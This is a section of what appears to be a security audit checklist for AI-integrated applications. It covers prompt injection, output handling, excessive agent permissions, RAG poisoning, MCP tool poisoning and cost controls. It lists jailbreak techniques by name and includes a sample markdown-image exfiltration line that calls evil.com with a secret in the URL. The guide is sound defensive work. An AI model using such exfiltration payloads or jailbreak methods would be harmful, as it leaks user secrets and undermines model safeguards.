## CATEGORY 15: AI API Security

> **OWASP references:** LLM01 (Prompt Injection), LLM02 (Sensitive Information Disclosure), LLM05 (Improper Output Handling), LLM06 (Excessive Agency), LLM07 (System Prompt Leakage), LLM10 (Unbounded Consumption). Also covers ASI01–ASI06 from the OWASP Top 10 for Agentic Applications (2026).
>
> **Cross-reference:** Category 3 (Hardcoded Secrets) covers key exposure in general. This category focuses on AI-specific risks: prompt injection, output handling, agent permissions, conversation security, and cost controls.

### Detection
- AI SDK imports: `openai`, `@anthropic-ai/sdk`, `ai`, `@ai-sdk/openai`, `@ai-sdk/anthropic`, `@langchain/core`, `langchain`, `llamaindex`, `@google/generative-ai`, `cohere-ai`
- Environment variables: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GOOGLE_AI_API_KEY`, `COHERE_API_KEY`
- Agent/tool frameworks: `@modelcontextprotocol/sdk`, `autogen`, `crewai`, `langchain/agents`
- RAG patterns: vector store imports (`@pinecone-database/pinecone`, `chromadb`, `weaviate-client`, `@qdrant/js-client-rest`, `pgvector`)
- Chat/conversation handlers with message history accumulation

### What to Search For

**Prompt injection (direct):**
- User input concatenated or interpolated into prompt strings without structural separation
- Template literals building prompts: `` `You are a helper. User says: ${userInput}` ``
- System prompts that contain secrets, API keys, internal URLs, or authorization logic
- Reliance on "never reveal your instructions" as a security control

**Prompt injection (indirect):**
- External content (web scraping, file uploads, database rows, emails) fed into LLM context without sanitization
- RAG pipelines where retrieved document chunks are inserted directly into prompts
- Tool results passed back to the model without sanitization

**Multi-turn jailbreaks (Crescendo, Many-Shot, Skeleton Key, Bad Likert Judge):**
- Full conversation history passed to the model without per-turn content filtering
- No limit on conversation length or context window usage
- No monitoring for escalation patterns across turns
- Chat handlers that blindly accumulate messages: `messages = [...history, newMessage]`

**Improper output handling (LLM-to-app injection):**
- LLM output used in SQL queries, shell commands, `eval()`, or `Function()` calls
- LLM output rendered as raw HTML/markdown without sanitization (XSS via AI output)
- LLM-generated code executed without sandboxing
- Text-to-SQL or natural-language-to-query patterns where output is executed directly

**Data exfiltration via output:**
- LLM output rendered as markdown with support for external images (markdown image injection: `![](https://evil.com/steal?data=SECRET)`)
- No CSP restricting image sources in chat UI
- No URL allowlisting on rendered LLM content

**Excessive agency / over-permissioned agents:**
- Agent tools registered with more permissions than needed (write/delete when only read is required)
- Database credentials with admin access passed to agent tool functions
- No human-in-the-loop confirmation for destructive actions
- Shell/command execution tools available to the agent

**Sensitive data in prompts:**
- User PII (names, emails, medical data) included in prompts sent to external LLM APIs
- Full prompt/completion pairs logged to files, databases, or third-party services without redaction
- Conversation history stored in plaintext

**Unbounded consumption / denial of wallet:**
- No `max_tokens` on API calls
- No per-user rate limiting on AI endpoints
- No per-user or per-session token budget
- Agent loops without iteration limits (`while (!done)` with no max)
- No timeout on LLM API calls

**RAG poisoning:**
- User-submitted content automatically indexed into vector stores without validation
- No per-user isolation of vector store data (user A can retrieve user B's documents)
- Web-scraped content fed directly into knowledge base

**MCP / tool supply chain:**
- MCP server packages installed from unvetted sources without pinned versions
- Tool descriptions containing hidden instruction-like text (tool poisoning)
- Multiple MCP servers connected to the same agent without isolation

### Critical
- AI API key (`sk-*`, `sk-ant-*`) in client-side code, `NEXT_PUBLIC_*` variables, or frontend bundles
- LLM output passed directly to `eval()`, `exec()`, `Function()`, shell execution, or raw SQL execution without parameterization
- Agent with shell/command execution tool + network access + no human approval gate
- No expiration or budget cap on API key — a leaked key has unlimited spend
- User input concatenated directly into system prompt that contains API keys, database URLs, or authorization rules

### High
- Direct prompt injection: user input interpolated into prompts with no structural boundary or content filtering
- Full conversation history sent to model with no per-turn safety re-evaluation (vulnerable to Crescendo, Many-Shot, Skeleton Key jailbreaks)
- LLM output rendered as markdown/HTML without sanitization — enables XSS and markdown image exfiltration
- No rate limiting on AI endpoints (denial-of-wallet — attacker can burn through your API budget)
- No `max_tokens` set on any API call (single request can generate maximum-length response at full cost)
- System prompt contains secrets, internal URLs, or authorization logic (extractable via prompt leakage techniques)
- Agent tools with write/delete permissions when only read is needed (excessive agency)
- User PII sent to external LLM API with no redaction and no data processing agreement
- RAG pipeline with no per-user isolation — any user can retrieve any document
- User uploads automatically indexed into shared vector store without review

### Medium
- Prompt/completion pairs logged to console, files, or third-party observability tools (Langfuse, LangSmith, Helicone) without PII redaction
- No input length validation before API calls (context window stuffing)
- Raw API error messages exposed to users (may leak model config, internal URLs, or prompt fragments)
- Agent loops without explicit iteration limits (could run indefinitely on bad input)
- MCP servers installed from npm/pip without pinned versions or integrity checks
- System prompt relies on "never reveal these instructions" as a security mechanism (trivially bypassed)
- No relevance score threshold on RAG retrieval (low-quality matches included in context)
- AI API keys in `.env` files that are not in `.gitignore` (may end up in git history)

### Context Check
1. Is the AI endpoint server-only or reachable from client code?
2. Is user input structurally separated from system instructions (separate message roles), or concatenated into a single string?
3. Does the app filter or validate LLM output before using it in downstream operations (SQL, HTML, shell, file paths)?
4. For chat apps: is conversation history re-evaluated for safety on each turn, or passed through blindly?
5. Does the app render LLM output as markdown/HTML? If so, are external images blocked?
6. For agents: what tools are registered, and do they follow least-privilege? Is there a human approval step for destructive actions?
7. Is user PII included in prompts? Are prompts/completions logged?
8. Are there cost controls: `max_tokens`, rate limits, per-user budgets, agent loop limits?
9. For RAG apps: is the vector store per-user, or shared? Can users contribute content to the knowledge base?

### NOT Vulnerable
- API keys in server-only code loaded from environment variables, never exposed to the client
- User input passed as a separate `user` role message with clear structural separation from the system prompt
- LLM output treated as untrusted: HTML-escaped before rendering, parameterized before SQL, never passed to eval/exec
- Per-turn content filtering on both input and output in chat applications
- Conversation length bounded with sliding window or summarization
- Agent tools scoped to minimum necessary permissions with human approval for destructive actions
- PII redacted before prompt assembly; logging excludes or redacts prompt content
- `max_tokens` set on all API calls; per-user rate limits enforced; API spend alerts configured
- RAG with per-user namespaces and access control metadata on vector queries
- System prompt contains no secrets — authorization enforced at the application layer
- Strict CSP blocking external image sources in chat UI (prevents markdown exfiltration)
- MCP server versions pinned with integrity hashes; tool descriptions reviewed

### Files to Check
- `**/ai/**`, `**/chat/**`, `**/llm/**`, `**/agent/**`, `**/rag/**`
- `**/openai*.{ts,js}`, `**/anthropic*.{ts,js}`, `**/completion*.{ts,js}`
- `pages/api/ai*`, `pages/api/chat*`, `app/api/ai*`, `app/api/chat*`
- `**/tools/**`, `**/functions/**`, `**/plugins/**` (agent tool definitions)
- `**/embed*.{ts,js}`, `**/vector*.{ts,js}`, `**/index*.{ts,js}` (RAG pipelines)
- `**/mcp*.{ts,js}`, `.cursor/mcp.json`, `claude_desktop_config.json`, `mcp.json`
- `.env*`, `**/config/**`
